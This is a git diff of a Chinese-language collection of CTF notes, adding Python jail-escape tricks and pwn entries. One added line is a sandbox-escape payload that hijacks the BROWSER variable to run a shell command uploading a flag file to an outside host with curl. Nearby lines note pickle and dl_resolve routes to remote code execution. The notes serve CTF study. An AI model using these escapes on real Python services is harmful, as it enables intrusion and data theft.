@@ -470,6 +470,8 @@ gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai
     - https://github.com/rwandi-ctf/ctf-writeups/blob/main/amateursctf2023/censorships.md#censorship-lite-1 :过滤掉部分字符后可以利用python对字符串的[转换](https://stackoverflow.com/questions/961632/convert-integer-to-string-in-python)从函数等地方取。
 - [Get and set](https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Get%20and%20set):能无限次对某个空object使用`pydash.set_`和`pydash.get`，参数无限制，实现rce。总体思路：Get `__builtins__` from `__reduce_ex__(3)[0].__builtins__`, and you can call arbitrary functions using magic methods like `__getattr__` or `__getitem__`
 - [You shall not call](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Misc/you_shall_not_call),[wp](https://gist.github.com/lebr0nli/eec8f5addd77064f1fa0e8b22b6a54f5)；[You shall not call Revenge](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Misc/you_shall_not_call-revenge),[wp](https://gist.github.com/lebr0nli/53216005991d012470c0bde0f38952b1):两个都是有关pickle的的pyjail，用有限的pickle code构造pickle object。前者只需读文件，revenge需要得到rce
+- [My Third Calculator](https://ireland.re/posts/TheFewChosen_2023/#my-third-calculator):`__import__('antigravity',setattr(__import__('os'),'environ',{'BROWSER':'/bin/sh -c "curl -T flag ip;exit" #%s'}))`.antigravity是python里一个彩蛋模块，导入它会打开[xkcd](https://xkcd.com/353/)。通过将环境变量browser改为shell命令，就能在导入时执行shell命令而不是打开网页
+- `list(open("flag.txt"))`:需要在`print(eval(input()))`或者python console的情况下使用。单纯eval是没有输出的
 40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
 ```python
 p=remote("",443,ssl=True)
@@ -1222,5 +1224,7 @@ int main() {
 }
 ```
 虽然不算什么知识点，但我觉得应该不能有比这还小的elf pwn题了吧？所以记录一下，说不定这么特殊的以后还会遇到呢？或者以后遇到稍微大点的elf也不怕了。minimal是getshell，minimaler是orw。其他解法： https://gist.github.com/unvariant/9ac05bc3214fdfd6835ac38617508a94 。这个思路之前没见过：利用栈迁移在bss段里构造假的Elf64_Rela, Elf64_Sym, 和symbol，然后调用dl_resolver加上合适的参数即可调用`system("/bin/sh")`。似乎连加沙盒的也能这样通解
-115. [SHELLO-WORLD](https://github.com/JOvenOven/ctf-writeups/tree/main/TFC_CTF_2023/pwn/shello_world）
+115. [SHELLO-WORLD](https://github.com/JOvenOven/ctf-writeups/tree/main/TFC_CTF_2023/pwn/shello_world)
 - pwntools FmtStr object使用
+116. [format_level3](../../CTF/moectf/2023/Pwn/format_level3.md)
+- bss段上的格式化字符串。之前其实记过，就是用args和三级指针。但是做这题时发现了一个如果本地偏移和远程不一样时（且无法获取远程dockerfile调试）的做法
